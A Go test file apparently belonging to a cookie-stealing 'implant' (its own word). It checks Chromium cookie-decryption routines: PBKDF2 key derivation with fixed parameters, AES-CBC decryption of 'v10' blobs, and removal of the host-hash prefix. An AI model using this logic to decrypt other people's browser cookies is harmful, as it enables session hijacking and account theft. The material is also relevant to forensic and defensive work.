//go:build darwin || linux

package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"testing"
)

// TestDeriveKeyMatchesChromium checks the PBKDF2 parameters against a value
// produced independently (Python hashlib.pbkdf2_hmac with the same inputs).
func TestDeriveKeyMatchesChromium(t *testing.T) {
	// pbkdf2_hmac('sha1', b'peanuts', b'saltysalt', 1, 16).hex()
	const want = "fd621fe5a2b402539dfa147ca9272778"
	key, err := deriveKey("peanuts", "saltysalt", 1, 16)
	if err != nil {
		t.Fatal(err)
	}
	if got := hexEncode(key); got != want {
		t.Fatalf("deriveKey = %s, want %s", got, want)
	}
	key, err = deriveKey("peanuts", "saltysalt", 1003, 16)
	if err != nil {
		t.Fatal(err)
	}
	if len(key) != 16 {
		t.Fatalf("len %d", len(key))
	}
}

func hexEncode(b []byte) string {
	const hexdigits = "0123456789abcdef"
	out := make([]byte, 0, len(b)*2)
	for _, c := range b {
		out = append(out, hexdigits[c>>4], hexdigits[c&0xf])
	}
	return string(out)
}

// TestCBCDecryptRoundTrip encrypts the way Chromium does (16-space IV, v10
// prefix, PKCS#7) and checks the implant recovers the value.
func TestCBCDecryptRoundTrip(t *testing.T) {
	key, err := deriveKey("peanuts", "saltysalt", 1, 16)
	if err != nil {
		t.Fatal(err)
	}
	plain := []byte("hunter2-cookie-value")
	block, err := aes.NewCipher(key)
	if err != nil {
		t.Fatal(err)
	}
	pad := aes.BlockSize - len(plain)%aes.BlockSize
	padded := append(append([]byte{}, plain...), bytes.Repeat([]byte{byte(pad)}, pad)...)
	iv := bytes.Repeat([]byte{' '}, aes.BlockSize)
	ct := make([]byte, len(padded))
	cipher.NewCBCEncrypter(block, iv).CryptBlocks(ct, padded)
	blob := append([]byte("v10"), ct...)

	got, ok := cbcDecrypt(key, blob)
	if !ok {
		t.Fatal("decrypt failed")
	}
	if string(got) != string(plain) {
		t.Fatalf("got %q want %q", got, plain)
	}

	// CBC carries no integrity tag, so a wrong key yields garbage rather than a
	// clean error - what must never happen is recovering the real plaintext.
	// (That is why Chromium protects the key itself with DPAPI/Keychain.)
	bad := make([]byte, len(key))
	if out, ok := cbcDecrypt(bad, blob); ok && string(out) == string(plain) {
		t.Fatal("wrong key produced the plaintext")
	}
	// non-v10 blobs are rejected
	if _, ok := cbcDecrypt(key, []byte("plaintext")); ok {
		t.Fatal("accepted a non-v10 blob")
	}
}

// TestCookiePrefixStrip documents the 32-byte SHA256(host) prefix Chromium
// prepends to cookie plaintext.
func TestCookiePrefixStrip(t *testing.T) {
	plain := append(bytes.Repeat([]byte{0xAB}, 32), []byte("value123")...)
	if got := stripCookiePrefix(plain); string(got) != "value123" {
		t.Fatalf("got %q", got)
	}
	short := []byte("short")
	if got := stripCookiePrefix(short); string(got) != "short" {
		t.Fatalf("short value mutated: %q", got)
	}
}
